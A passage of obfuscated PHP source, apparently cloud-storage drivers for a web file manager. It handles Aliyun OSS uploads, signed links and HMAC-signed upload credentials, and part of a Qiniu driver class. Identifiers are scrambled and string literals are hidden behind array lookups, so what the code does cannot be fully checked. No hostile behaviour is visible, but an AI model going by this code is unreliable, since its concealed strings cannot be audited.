$À‚†‹Ä§ = $this->trafficLimit($àÔÉÊ’º[1418]); $÷©½ªÄ« = $this->client->putObject($this->bucket, $this->pathEncode($ù„éÓ ), $†÷ßƒÖ±, $À‚†‹Ä§); } catch (OSS\Core\OssException $‘°Àê±²) { return !1; } $Ï«Ş¾Õ¬ = array($àÔÉÊ’º[1408] => trim($÷©½ªÄ«[$àÔÉÊ’º[1419]], $àÔÉÊ’º[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ù„éÓ ))); $this->updateObjMeta($ù„éÓ , $Ï«Ş¾Õ¬); return isset($÷©½ªÄ«[$àÔÉÊ’º[1420]][$àÔÉÊ’º[1367]]) ? !0 : !1; } private function updateObjMeta($£Â‡îŞ¤, $›ÄİÅı…) { $£Â‡îŞ¤ = $this->pathEncode($£Â‡îŞ¤); try { $œ©’í£× = array(OSS\OssClient::OSS_HEADERS => $›ÄİÅı…); $this->client->copyObject($this->bucket, $£Â‡îŞ¤, $this->bucket, $£Â‡îŞ¤, $œ©’í£×); } catch (OSS\Core\OssException $´–ïç¯è) { return !1; } return !0; } public function upload($™äãÏƒé, $ïîöìì, $ˆ’Äèò– = false, $Îû£ş¨À = REPEAT_REPLACE) { $Œ°ûÑ ó =& $_SERVER[ñˆ‹ß¿÷]; $°öÕÚ»¯ = trim($™äãÏƒé, $Œ°ûÑ ó[8]); $ÁŞ§ûª = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Œ°ûÑ ó[1408] => @md5_file($ïîöìì)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($™äãÏƒé))); $ÁŞ§ûª = $this->trafficLimit($Œ°ûÑ ó[1418], $ÁŞ§ûª); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($°öÕÚ»¯), $ïîöìì, $ÁŞ§ûª); } catch (OSS\Core\OssException $¿‰€ˆö´) { return !1; } return $this->getPathOuter($™äãÏƒé); } public function getHost() { $ú¡÷¨»¸ =& $_SERVER[ñˆ‹ß¿÷]; $ĞÔó²Ğ = explode($ú¡÷¨»¸[183], parent::getHost()); return $ĞÔó²Ğ[0] . $ú¡÷¨»¸[183] . $this->bucket . $ú¡÷¨»¸[10] . $ĞÔó²Ğ[1]; } public function uploadFormData($€äƒÔœ, $ê¹×ÓÎğ = 3600) { $ãÀ²¯ã =& $_SERVER[ñˆ‹ß¿÷]; if (!($ÑŒåÕ–“ = $this->getHost())) { return !1; } $óÜèáÙµ = $ê¹×ÓÎğ; $½±âè“æ = date($ãÀ²¯ã[1421], time() + $óÜèáÙµ); $š®À¶æÜ = new DateTime($½±âè“æ); $°ù‰ô³š = $š®À¶æÜ->format(DateTime::ISO8601); $‹Š‰Š = strpos($°ù‰ô³š, $ãÀ²¯ã[296]); $°ù‰ô³š = substr($°ù‰ô³š, 0, $‹Š‰Š) . $ãÀ²¯ã[1422]; $ïÏšÚ»ƒ = 1048576000 * 5; $Ğùõ©“ó = $this->pathFather($€äƒÔœ); $îèé ¤£ = array($ãÀ²¯ã[1319] => $°ù‰ô³š, $ãÀ²¯ã[1320] => array(array($ãÀ²¯ã[1423], 0, $ïÏšÚ»ƒ), array($ãÀ²¯ã[1323], $ãÀ²¯ã[1324], $Ğùõ©“ó))); $ø±«û£ = base64_encode(json_encode($îèé ¤£)); $ïæº‡åŒ = base64_encode(hash_hmac($ãÀ²¯ã[232], $ø±«û£, $this->secret, !0)); $İòŠêÔ = array($ãÀ²¯ã[1329] => $ø±«û£, $ãÀ²¯ã[1424] => $this->accessKey, $ãÀ²¯ã[1325] => $ãÀ²¯ã[1317], $ãÀ²¯ã[1425] => $ïæº‡åŒ, $ãÀ²¯ã[181] => $ÑŒåÕ–“); $İòŠêÔ = $this->trafficLimit($ãÀ²¯ã[1418], $İòŠêÔ); return $İòŠêÔ; } public function multiUploadFormData($­ÌùúÖ€, $à“Î½‹Ö = 3600) { $—£³¿‡˜ =& $_SERVER[ñˆ‹ß¿÷]; if (!($£çĞ½ = $this->getHost())) { return !1; } $—·ŒŠÜõ = $this->trafficLimit($—£³¿‡˜[1418]); $È•„îö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($­ÌùúÖ€), $—·ŒŠÜõ); return array($—£³¿‡˜[223] => $È•„îö, $—£³¿‡˜[181] => $£çĞ½ . $—£³¿‡˜[8] . $this->pathEncode($­ÌùúÖ€), $—£³¿‡˜[224] => gmdate($—£³¿‡˜[1426]), $—£³¿‡˜[94] => $­ÌùúÖ€); } public function multiUploadAuthData($ìãŒïó, $ò¼ø’İ» = array()) { $“¼„ö¿Ï =& $_SERVER[ñˆ‹ß¿÷]; $«¼€ÑïÀ = isset($ò¼ø’İ»[$“¼„ö¿Ï[224]]) ? $ò¼ø’İ»[$“¼„ö¿Ï[224]] : gmdate($“¼„ö¿Ï[1426]); $’±ƒä–Ÿ = isset($ò¼ø’İ»[$“¼„ö¿Ï[174]]) ? $ò¼ø’İ»[$“¼„ö¿Ï[174]] : $“¼„ö¿Ï[12]; $İü¢ÌÍŒ = $ìãŒïó; if (isset($ò¼ø’İ»[$“¼„ö¿Ï[94]])) { $İü¢ÌÍŒ = $ò¼ø’İ»[$“¼„ö¿Ï[94]]; unset($ò¼ø’İ»[$“¼„ö¿Ï[94]]); } if (isset($ò¼ø’İ»[$“¼„ö¿Ï[225]])) { $ò¼ø’İ»[$“¼„ö¿Ï[224]] = $«¼€ÑïÀ; return $this->listUploadParts($İü¢ÌÍŒ, $ò¼ø’İ»); } $ö¦äŸÑ› = array($“¼„ö¿Ï[226], $“¼„ö¿Ï[12], $“¼„ö¿Ï[120], $«¼€ÑïÀ, "\x78\x2d\157\163\x73\x2d\144\x61\164\x65\72{$«¼€ÑïÀ}", $“¼„ö¿Ï[8] . $this->bucket . $“¼„ö¿Ï[8] . $İü¢ÌÍŒ . $’±ƒä–Ÿ); if (strpos($’±ƒä–Ÿ, $“¼„ö¿Ï[227]) === 0) { $ö¦äŸÑ›[0] = $“¼„ö¿Ï[228]; if ($ÏÅ–Šâ· = $this->trafficLimit($“¼„ö¿Ï[1418])) { $İü¢ÌÍŒ = $“¼„ö¿Ï[1427]; array_splice($ö¦äŸÑ›, 5, 0, $İü¢ÌÍŒ . $“¼„ö¿Ï[4] . $ÏÅ–Šâ·[$İü¢ÌÍŒ]); } } if (isset($ò¼ø’İ»[$“¼„ö¿Ï[229]]) && $ò¼ø’İ»[$“¼„ö¿Ï[229]] == $“¼„ö¿Ï[230]) { $ö¦äŸÑ›[0] = $“¼„ö¿Ï[230]; } if (!empty($ò¼ø’İ»[$“¼„ö¿Ï[1428]])) { $òóš†ş = array_merge(array($ö¦äŸÑ›[4]), $ò¼ø’İ»[$“¼„ö¿Ï[1428]]); sort($òóš†ş); $ö¦äŸÑ›[4] = implode($“¼„ö¿Ï[231], $òóš†ş); } $¼Ã­åÉâ = implode($“¼„ö¿Ï[231], $ö¦äŸÑ›); $æ»“ìëä = base64_encode(hash_hmac($“¼„ö¿Ï[232], $¼Ã­åÉâ, $this->secret, !0)); $ß²œ·ø = $“¼„ö¿Ï[1392] . $this->accessKey . $“¼„ö¿Ï[4] . $æ»“ìëä; if (strpos($’±ƒä–Ÿ, $“¼„ö¿Ï[227]) === 0) { $ß²œ·ø = array($“¼„ö¿Ï[234] => $ß²œ·ø, $“¼„ö¿Ï[224] => $«¼€ÑïÀ); if ($ÏÅ–Šâ·) { $ß²œ·ø = array_merge($ß²œ·ø, $ÏÅ–Šâ·); } } return $ß²œ·ø; } public function listUploadParts($´§Ëø² , $²ëáßÌ§) { $‡ÈÚ­³Š =& $_SERVER[ñˆ‹ß¿÷]; $‘‘¸ö§ = parse_url_query($²ëáßÌ§[$‡ÈÚ­³Š[174]]); $öËø§À = $this->client->listParts($this->bucket, $this->pathEncode($´§Ëø² ), $‘‘¸ö§[$‡ÈÚ­³Š[223]]); $†™¯Íêõ = $öËø§À->getListPart(); $´ŸÊ„Á… = array(); foreach ($†™¯Íêõ as $±èäÜ¦„) { $´ŸÊ„Á…[] = array($‡ÈÚ­³Š[1412] => $±èäÜ¦„->getPartNumber(), $‡ÈÚ­³Š[1413] => trim($±èäÜ¦„->getETag(), $‡ÈÚ­³Š[118])); } unset($²ëáßÌ§[$‡ÈÚ­³Š[225]], $²ëáßÌ§[$‡ÈÚ­³Š[229]]); $—ƒĞÏ„ë = $this->multiUploadAuthData($´§Ëø² , $²ëáßÌ§); if (empty($—ƒĞÏ„ë)) { return !1; } return array($‡ÈÚ­³Š[234] => $—ƒĞÏ„ë, $‡ÈÚ­³Š[224] => $²ëáßÌ§[$‡ÈÚ­³Š[224]], $‡ÈÚ­³Š[236] => $´ŸÊ„Á…); } public function download($º×ÍÂû, $¢î”ô¦—) { if ($this->isFolder($º×ÍÂû)) { return !1; } try { $–Œ©ÉŒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¢î”ô¦—); $–Œ©ÉŒ = $this->trafficLimit($_SERVER[ñˆ‹ß¿÷][109], $–Œ©ÉŒ); $this->client->getObject($this->bucket, $this->pathEncode($º×ÍÂû), $–Œ©ÉŒ); } catch (OSS\Core\OssException $¢êû°ü§) { return !1; } return $¢î”ô¦—; } public function fileSubstr($›œ–£„Ø, $¯ÅÉµğ = 0, $ã˜³¶ª = false) { if ($¯ÅÉµğ === -1) { $ÃÛœ½± = array(); } else { if ($ã˜³¶ª === !1) { $ñË¢¥ôÖ = $this->size($›œ–£„Ø); } else { $ñË¢¥ôÖ = $¯ÅÉµğ + $ã˜³¶ª - 1; } $ÃÛœ½± = array(OSS\OssClient::OSS_RANGE => "{$¯ÅÉµğ}\x2d{$ñË¢¥ôÖ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($›œ–£„Ø), $ÃÛœ½±); } catch (OSS\Core\OssException $Ùœ°òÊÕ) { think_exception($Ùœ°òÊÕ->getMessage()); return !1; } } private function trafficLimit($´ƒ¾ƒÕ», $œªıãªê = array()) { $»¬ìèï =& $_SERVER[ñˆ‹ß¿÷]; if ($´ƒ¾ƒÕ» == $»¬ìèï[1418] && $this->isUploadServer() || $´ƒ¾ƒÕ» == $»¬ìèï[109] && $this->isFileOutServer()) { return $œªıãªê; } $ÖÄ¤Ü± = floatval($GLOBALS[$»¬ìèï[6]][$»¬ìèï[89]][$»¬ìèï[107]][$´ƒ¾ƒÕ»]) * 1024 * 1024 * 8; if (!$ÖÄ¤Ü±) { return $œªıãªê; } $ÖÄ¤Ü± = $ÖÄ¤Ü± < 819200 ? 819200 : ($ÖÄ¤Ü± > 838860800 ? 838860800 : $ÖÄ¤Ü±); $œªıãªê[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÖÄ¤Ü±); return $œªıãªê; } public function link($Í¿îú‹¯, $ÚíŠ©ÒŒ = array()) { $í¦Ø·Ô˜ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->exist($Í¿îú‹¯) || $this->isFolder($Í¿îú‹¯)) { return !1; } try { $ÚíŠ©ÒŒ = $this->trafficLimit($í¦Ø·Ô˜[109], $ÚíŠ©ÒŒ); $Ÿ‡¸“Ú¹ = $this->client->signUrl($this->bucket, $this->pathEncode($Í¿îú‹¯), 3600 * 12, $í¦Ø·Ô˜[230], $ÚíŠ©ÒŒ); return $this->getCdnLink($Ÿ‡¸“Ú¹); } catch (OSS\Core\OssException $›Ô‡Ü”†) { return !1; } } public function fileOut($Àæ”öÀ½, $©Õ¥Öä» = false, $»‘öŸ—† = false, $¥›ËˆÆâ = '') { $‹Îê”»ö =& $_SERVER[ñˆ‹ß¿÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($Àæ”öÀ½, $©Õ¥Öä», $»‘öŸ—†, $¥›ËˆÆâ); } if (!$»‘öŸ—†) { $»‘öŸ—† = $this->pathThis($Àæ”öÀ½); } $»‘öŸ—† = rawurlencode($»‘öŸ—†); $Ç£‡ îÚ = get_file_mime(get_path_ext($»‘öŸ—†)); if ($Ç£‡ îÚ == $‹Îê”»ö[217]) { return parent::fileOut($Àæ”öÀ½, $©Õ¥Öä», $»‘öŸ—†, $¥›ËˆÆâ); } $©Õ¥Öä» = $©Õ¥Öä» ? $‹Îê”»ö[1429] : $‹Îê”»ö[1430]; $ÖÇşÔë´ = array(OSS\OssClient::OSS_SUB_RESOURCE => $‹Îê”»ö[1431] . rawurlencode("{$©Õ¥Öä»}\73\146\151\x6c\145\156\x61\155\145\x3d{$»‘öŸ—†}")); $ÖÇşÔë´[OSS\OssClient::OSS_SUB_RESOURCE] .= $‹Îê”»ö[1432] . rawurlencode($Ç£‡ îÚ); $ù‹ÛŒ† = $this->link($Àæ”öÀ½, $ÖÇşÔë´); $this->fileOutLink($ù‹ÛŒ†); } public function fileOutServer($©¯¤¾ƒÉ, $ŸË¿ÅØš = false, $×¦ı¿«ª = false, $¸Ö‡“¥  = '') { parent::fileOut($©¯¤¾ƒÉ, $ŸË¿ÅØš, $×¦ı¿«ª, $¸Ö‡“¥ ); } public function fileOutImage($„ùÛÙ¹Â, $ó¥°Úà = 250) { $±êÊ£ğ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ñˆ‹ß¿÷][1433] . $ó¥°Úà); $îìÌ†ô = $this->link($„ùÛÙ¹Â, $±êÊ£ğ); $this->fileOutLink($îìÌ†ô); } public function fileOutImageServer($©áï¶½Ó, $’ÙïÅ° = 250) { parent::fileOutImage($©áï¶½Ó, $’ÙïÅ°); } public function fileOutLink($úõœİ©¥) { $ÈşïçûŒ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->isCdnHost() && substr($úõœİ©¥, 0, 7) == $ÈşïçûŒ[1332]) { $úõœİ©¥ = $ÈşïçûŒ[1333] . substr($úõœİ©¥, 7); } header($ÈşïçûŒ[161] . $úõœİ©¥); die; } public function hashMd5($ˆÃÎ„Ü›, $°ŒÁîı = '') { $ê˜‘ˆâ‰ =& $_SERVER[ñˆ‹ß¿÷]; $ºÚã÷‹ = $this->_objectMeta($ˆÃÎ„Ü›); if (!$ºÚã÷‹) { return $ê˜‘ˆâ‰[12]; } if (!isset($ºÚã÷‹[$ê˜‘ˆâ‰[1408]]) && !empty($°ŒÁîı)) { $ò¢Ü”Ì = $this->updateObjMeta($ˆÃÎ„Ü›, array($ê˜‘ˆâ‰[1408] => $°ŒÁîı)); $ºÚã÷‹[$ê˜‘ˆâ‰[1408]] = $ò¢Ü”Ì ? $°ŒÁîı : $ê˜‘ˆâ‰[12]; } return isset($ºÚã÷‹[$ê˜‘ˆâ‰[1408]]) ? strtolower($ºÚã÷‹[$ê˜‘ˆâ‰[1408]]) : $ê˜‘ˆâ‰[12]; } public function size($’ç›¡úã) { $Ö€Ïşà½ = $this->objectMeta($’ç›¡úã); return $Ö€Ïşà½ ? $Ö€Ïşà½[$_SERVER[ñˆ‹ß¿÷][76]] : 0; } public function info($¹£ëíš—) { if ($this->isFolder($¹£ëíš—)) { return $this->folderInfo($¹£ëíš—); } else { if ($this->isFile($¹£ëíš—)) { return $this->fileInfo($¹£ëíš—); } } return !1; } public function exist($äÉ‡Êæ‰) { return $this->isFile($äÉ‡Êæ‰) || $this->isFolder($äÉ‡Êæ‰); } public function isFile($°ƒ¢ã) { return !$this->isFolder($°ƒ¢ã) && $this->objectMeta($°ƒ¢ã); } public function isFolder($Ê­Ùææ£) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][165], $Ê­Ùææ£); } protected function objectMeta($Â¶Ì¶È) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][167], $Â¶Ì¶È); } protected function _objectMeta($ÆÓ”•Œí) { $¥øæöÎÈ =& $_SERVER[ñˆ‹ß¿÷]; try { $¿ÖÇ¬Ö = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÆÓ”•Œí)); } catch (OSS\Core\OssException $ÁÄŸÂ¤²) { $¿ÖÇ¬Ö = !1; } if ($¿ÖÇ¬Ö) { $¿ÖÇ¬Ö[$¥øæöÎÈ[76]] = intval($¿ÖÇ¬Ö[$¥øæöÎÈ[1406]]); } return $¿ÖÇ¬Ö; } protected function _isFolder($‡«ƒ¬¢¸) { $Ô¸Êş©ã =& $_SERVER[ñˆ‹ß¿÷]; if ($‡«ƒ¬¢¸ == $Ô¸Êş©ã[12] || $‡«ƒ¬¢¸ == $Ô¸Êş©ã[8]) { return !0; } $—õ„šãÃ = array($Ô¸Êş©ã[1402] => $Ô¸Êş©ã[8], $Ô¸Êş©ã[1403] => rtrim($‡«ƒ¬¢¸, $Ô¸Êş©ã[8]) . $Ô¸Êş©ã[8], $Ô¸Êş©ã[1404] => 1, $Ô¸Êş©ã[1405] => $Ô¸Êş©ã[12]); $åÂ¹È©‹ = $this->client->listObjects($this->bucket, $—õ„šãÃ); if ($åÂ¹È©‹->getObjectList() || $åÂ¹È©‹->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($¤õü÷ó) { parent::__construct(); require_once SDK_DIR . $_SERVER[ñˆ‹ß¿÷][1434]; $this->_init($¤õü÷ó); } public function _init($µ²‚ˆàÄ) { $±Ù«õüı =& $_SERVER[ñˆ‹ß¿÷]; foreach ($µ²‚ˆàÄ as $›ÅÄ’‹ => $«Êßá‹Ä) { if (isset($this->{$›ÅÄ’‹})) { $this->{$›ÅÄ’‹} = $«Êßá‹Ä; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($±Ù«õüı[1435] . LNG($±Ù«õüı[1393])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÓÇğ¾÷è, $–µœ¥Ç = '', $¿ö•×ÊŒ = REPEAT_RENAME) { if ($this->setContent($ÓÇğ¾÷è, $–µœ¥Ç)) { return $this->getPathOuter($ÓÇğ¾÷è); } return !1; } public function mkdir($òîÕœ½, $œÅÒ’Ö = REPEAT_SKIP) { $œé‚ÜÓç =& $_SERVER[ñˆ‹ß¿÷]; $¼ºçü¤ì = trim($òîÕœ½, $œé‚ÜÓç[8]); if ($this->_isFolder($¼ºçü¤ì)) { return $this->getPathOuter($¼ºçü¤ì); } $òîÕœ½ = $¼ºçü¤ì . $œé‚ÜÓç[8]; $ŒÊû„æ¼ = get_path_this($¼ºçü¤ì); $¦ãàåıÇ = $òîÕœ½ . $ŒÊû„æ¼; if (!$this->mkfile($¦ãàåıÇ)) { return !1; } if (!$this->moveFile($¦ãàåıÇ, $òîÕœ½)) { $this->delFile($¦ãàåıÇ); return !1; } return $this->getPathOuter($¼ºçü¤ì); } public function copyFile($Ñ‰Ì›·¦, $Ã”ÇÀÛì) { $Õ‹Êœù‚ = $this->bucketManager->copy($this->bucket, $Ñ‰Ì›·¦, $this->bucket, $Ã”ÇÀÛì, !0); return $Õ‹Êœù‚ ? !1 : $this->getPathOuter($Ã”ÇÀÛì); } public function moveFile($ÌÕ‘¼À, $Ì™†İ›â) { $ó¾êÈ˜Æ = $this->bucketManager->move($this->bucket, $ÌÕ‘¼À, $this->bucket, $Ì™†İ›â, !0); return $ó¾êÈ˜Æ ? !1 : $this->getPathOuter($Ì™†İ›â); } public function delFile($…ŸæÊÍí) { if (!$this->exist($…ŸæÊÍí)) { return !0; } $òøıÚ™ = $this->bucketManager->delete($this->bucket, $…ŸæÊÍí); return $òøıÚ™ ? !1 : !0; } public function delFolder($Ò³£†ëŞ) { $Èœ‹Î±¢ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->exist($Ò³£†ëŞ)) { return !0; } $this->listItemCache = !1; $•ï¢ó£± = $this->fileList($Ò³£†ëŞ); $this->listItemCache = !0; $üÊã¶ş = trim($Ò³£†ëŞ, $Èœ‹Î±¢[8]) . $Èœ‹Î±¢[8]; if (!empty($Ò³£†ëŞ) && $Ò³£†ëŞ !== $Èœ‹Î±¢[197] && !in_array($üÊã¶ş, $•ï¢ó£±[$Èœ‹Î±¢[82]])) { $•ï¢ó£±[$Èœ‹Î±¢[82]][] = $üÊã¶ş; } $µÚŒ…­Ç = $this->delByBatch($•ï¢ó£±[$Èœ‹Î±¢[83]]); if (!$µÚŒ…­Ç) { return !1; } $µÚŒ…­Ç = $this->delByBatch($•ï¢ó£±[$Èœ‹Î±¢[82]]); if (!$µÚŒ…­Ç) { return !1; } return $this->delFile($üÊã¶ş); } private function delByBatch($Â¥›“³ü) { foreach (array_chunk($Â¥›“³ü, 1000) as $®û™ˆŒ) { $’ÒÇƒâ = $this->bucketManager->buildBatchDelete($this->bucket, $®û™ˆŒ); list($®º—ËÓÕ, $¹ÍŞ‰âº) = $this->bucketManager->batch($’ÒÇƒâ); if ($¹ÍŞ‰âº) { return !1; } } return !0; } public function rename($˜Ï©òüâ, $«Áòİ¡) { return $this->renameObject($˜Ï©òüâ, $«Áòİ¡); } public function fileInfo($ã›¿¾‹, $¡ï‹‘’ñ = false, $ÎËÏšø = array()) { $Èõ½ğ¼ =& $_SERVER[ñˆ‹ß¿÷]; $ß§Ìã„ = array($Èõ½ğ¼[32] => $this->pathThis($ã›¿¾‹), $Èõ½ğ¼[84] => $this->getPathOuter($Èõ½ğ¼[8] . $ã›¿¾‹), $Èõ½ğ¼[33] => $Èõ½ğ¼[199], $Èõ½ğ¼[76] => isset($ÎËÏšø[$Èõ½ğ¼[1436]]) ? $ÎËÏšø[$Èõ½ğ¼[1436]] : 0, $Èõ½ğ¼[174] => $this->ext($ã›¿¾‹)); if ($¡ï‹‘’ñ) { return $ß§Ìã„; } $ß§Ìã„[$Èõ½ğ¼[200]] = $ß§Ìã„[$Èõ½ğ¼[85]] = 0; $ß§Ìã„[$Èõ½ğ¼[201]] = $ß§Ìã„[$Èõ½ğ¼[202]] = !0; if (empty($ÎËÏšø)) { $ÎËÏšø = $this->objectMeta($ã›¿¾‹); if (!$ÎËÏšø) { return $ß§Ìã„; } } if (isset($ÎËÏšø[$Èõ½ğ¼[1437]])) { $ß§Ìã„[$Èõ½ğ¼[85]] = substr($ÎËÏšø[$Èõ½ğ¼[1437]] . $Èõ½ğ¼[12], 0, 10); } if (isset($ÎËÏšø[$Èõ½ğ¼[1436]])) { $ß§Ìã„[$Èõ½ğ¼[76]] = $ÎËÏšø[$Èõ½ğ¼[1436]]; } return $ß§Ìã„; } public function folderInfo($Ç­Á‡÷Ğ, $à•¥®µÁ = false) { $»´ğ÷— =& $_SERVER[ñˆ‹ß¿÷]; $ğ¶Ùù™É = array($»´ğ÷—[32] => $this->pathThis($Ç­Á‡÷Ğ), $»´ğ÷—[84] => $this->getPathOuter($»´ğ÷—[8] . $Ç­Á‡÷Ğ), $»´ğ÷—[33] => $»´ğ÷—[75]); if ($à•¥®µÁ) { return $ğ¶Ùù™É; } $ğ¶Ùù™É[$»´ğ÷—[200]] = $ğ¶Ùù™É[$»´ğ÷—[85]] = 0; $ğ¶Ùù™É[$»´ğ÷—[201]] = $ğ¶Ùù™É[$»´ğ÷—[202]] = !0; $Ç­Á‡÷Ğ = rtrim($Ç­Á‡÷Ğ, $»´ğ÷—[8]) . $»´ğ÷—[8]; $™ø×Ä°¼ = $this->objectMeta($Ç­Á‡÷Ğ); if (isset($™ø×Ä°¼[$»´ğ÷—[1437]])) { $ğ¶Ùù™É[$»´ğ÷—[85]] = substr($™ø×Ä°¼[$»´ğ÷—[1437]] . $»´ğ÷—[12], 0, 10); } return $ğ¶Ùù™É; } public function listPath($©Ÿòµé, $†øÔ¹Š = false) { $–½ÓÉÉ =& $_SERVER[ñˆ‹ß¿÷]; $¶×±ëŸÖ = $this->fileList($©Ÿòµé, $–½ÓÉÉ[8], !0); foreach ($¶×±ëŸÖ[$–½ÓÉÉ[82]] as $ëŠªñêÎ => $…§¡îæå) { $¶×±ëŸÖ[$–½ÓÉÉ[82]][$ëŠªñêÎ] = $this->folderInfo($…§¡îæå, $†øÔ¹Š); } foreach ($¶×±ëŸÖ[$–½ÓÉÉ[83]] as $ëŠªñêÎ => $…§¡îæå) { $¶×±ëŸÖ[$–½ÓÉÉ[83]][$ëŠªñêÎ] = $this->fileInfo($…§¡îæå[$–½ÓÉÉ[94]], $†øÔ¹Š, $…§¡îæå); } return $¶×±ëŸÖ; } public function has($¬†èÃŒî, $ ß£ƒ±ç = false, $ç®³±§† = true) { $ç¤Ì…Ó« =& $_SERVER[ñˆ‹ß¿÷]; $¬†èÃŒî = trim($¬†èÃŒî, $ç¤Ì…Ó«[8]); $Äîô¨ã = empty($¬†èÃŒî) && $¬†èÃŒî !== $ç¤Ì…Ó«[197] ? $ç¤Ì…Ó«[12] : $¬†èÃŒî . $ç¤Ì…Ó«[8]; $»‹ƒú†Ø = $ç¤Ì…Ó«[12]; $¶”¨èíƒ = 500; $¨¶é³½ = $ç¤Ì…Ó«[8]; $ éğ¬Â’ = $äÚ«ˆÅÁ = 0; while (!0) { check_abort(); list($£ÖÔ‡É’, $™ŸÔß¸) = $this->bucketManager->listFiles($this->bucket, $Äîô¨ã, $»‹ƒú†Ø, $¶”¨èíƒ, $¨¶é³½); if ($™ŸÔß¸) { break; } $»‹ƒú†Ø = array_key_exists($ç¤Ì…Ó«[1405], $£ÖÔ‡É’) ? $»‹ƒú†Ø = $£ÖÔ‡É’[$ç¤Ì…Ó«[1438]] : $ç¤Ì…Ó«[12]; if ($ ß£ƒ±ç) { if (!empty($£ÖÔ‡É’[$ç¤Ì…Ó«[1439]])) { $ éğ¬Â’ += count($£ÖÔ‡É’[$ç¤Ì…Ó«[1439]]); } if (!empty($£ÖÔ‡É’[$ç¤Ì…Ó«[1440]])) { $äÚ«ˆÅÁ += count($£ÖÔ‡É’[$ç¤Ì…Ó«[1440]]); } if ($»‹ƒú†Ø === $ç¤Ì…Ó«[12]) { break; } continue; } if ($ç®³±§†) { if (!empty($£ÖÔ‡É’[$ç¤Ì…Ó«[1439]])) { return !0; } } else { if (!empty($£ÖÔ‡É’[$ç¤Ì…Ó«[1440]])) { return !0; } } if ($»‹ƒú†Ø === $ç¤Ì…Ó«[12]) { break; } } if ($ ß£ƒ±ç) { return array($ç¤Ì…Ó«[207] => $ éğ¬Â’, $ç¤Ì…Ó«[208] => $äÚ«ˆÅÁ); } return !1; } public function listAll($ÕåŒÃÇŠ) { $âÎú›ú– =& $_SERVER[ñˆ‹ß¿÷]; $Û„ ´’Ö = $this->fileList($ÕåŒÃÇŠ, $âÎú›ú–[12], !0); $€°æÔŒÄ = array(); foreach ($Û„ ´’Ö[$âÎú›ú–[83]] as $˜ßÄ®Åì) { $€°æÔŒÄ[$˜ßÄ®Åì[$âÎú›ú–[94]]] = $˜ßÄ®Åì[$âÎú›ú–[76]]; } foreach ($Û„ ´’Ö[$âÎú›ú–[82]] as $˜ßÄ®Åì) { if (is_string($˜ßÄ®Åì)) { $€°æÔŒÄ[$˜ßÄ®Åì] = 0; } } return $this->listAllFiles($ÕåŒÃÇŠ, array_keys($€°æÔŒÄ), $€°æÔŒÄ); } private function fileList($Š¯Îìñ, $–§È´é§ = '', $¸ÆèáŒÎ = 0) { $Åú¿¦² =& $_SERVER[ñˆ‹ß¿÷]; $Š¯Îìñ = trim($Š¯Îìñ, $Åú¿¦²[8]); $Š„Û»Ä„ = empty($Š¯Îìñ) && $Š¯Îìñ !== $Åú¿¦²[197] ? $Åú¿¦²[12] : $Š¯Îìñ . $Åú¿¦²[8]; $µ³ÄÏ‹‡ = $Åú¿¦²[12]; $ÓßÌüË = 1000; $àÀ­„ò‹ = $ô´Ø‡Æú = array(); while (!0) { check_abort(); list($ÔÜ İğü, $¤¿õ´‰) = $this->bucketManager->listFiles($this->bucket, $Š„Û»Ä„, $µ³ÄÏ‹‡, $ÓßÌüË, $–§È´é§); if ($¤¿õ´‰) { break; } $µ³ÄÏ‹‡ = array_key_exists($Åú¿¦²[1405], $ÔÜ İğü) ? $µ³ÄÏ‹‡ = $ÔÜ İğü[$Åú¿¦²[1438]] : $Åú¿¦²[12]; $ºç’“ı = isset($ÔÜ İğü[$Åú¿¦²[1439]]) ? $ÔÜ İğü[$Åú¿¦²[1439]] : array(); $÷¶şü³– = isset($ÔÜ İğü[$Åú¿¦²[1440]]) ? $ÔÜ İğü[$Åú¿¦²[1440]] : array(); foreach ($ºç’“ı as $ôÂÀÂ“±) { if ($ôÂÀÂ“±[$Åú¿¦²[94]] == $Š„Û»Ä„) { continue; } $²šùì’Ø = $ôÂÀÂ“±[$Åú¿¦²[94]]; $¸ïÂöéÃ = $ôÂÀÂ“±[$Åú¿¦²[1436]]; $ôÂÀÂ“±[$Åú¿¦²[76]] = $¸ïÂöéÃ; $„ŒœñÄğ = $¸ïÂöéÃ == 0 && substr($²šùì’Ø, strlen($²šùì’Ø) - 1, 1) == $Åú¿¦²[8] ? !0 : !1; $this->cacheMethodInfoSet($²šùì’Ø, $„ŒœñÄğ, $ôÂÀÂ“±); if ($„ŒœñÄğ) { $àÀ­„ò‹[] = $²šùì’Ø; continue; } $ô´Ø‡Æú[] = $¸ÆèáŒÎ ? $ôÂÀÂ“± : $²šùì’Ø; } foreach ($÷¶şü³– as $²šùì’Ø) { if ($²šùì’Ø == $Š„Û»Ä„) { continue; } $àÀ­„ò‹[] = $²šùì’Ø; $this->cacheMethodInfoSet($²šùì’Ø, !0); } if ($µ³ÄÏ‹‡ 